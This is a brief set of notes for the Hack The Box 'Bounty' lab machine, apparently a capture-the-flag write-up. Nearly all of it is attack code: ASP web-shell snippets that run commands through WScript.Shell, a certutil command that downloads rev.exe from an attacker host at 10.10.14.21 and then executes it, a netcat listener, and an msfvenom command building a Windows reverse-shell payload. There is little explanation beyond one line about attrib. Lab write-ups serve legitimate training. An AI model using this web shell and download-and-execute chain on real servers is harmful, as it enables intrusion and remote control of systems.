# Hack The Box: Bounty

ASP-Shell

<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c whoami")
o = cmd.StdOut.Readall()
Response.write(o)
%>

<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c certutil -urlcache -split -f http://10.10.14.21/rev.exe C:\\windows\temp\\rev.exe")
%>

<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c C:\\windows\temp\\rev.exe")
%>

```zsh
rlwrap nc 443
```

use of attrib to see hidden files

```zsh
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.21 LPORT=443 -f exe > rev.exe
```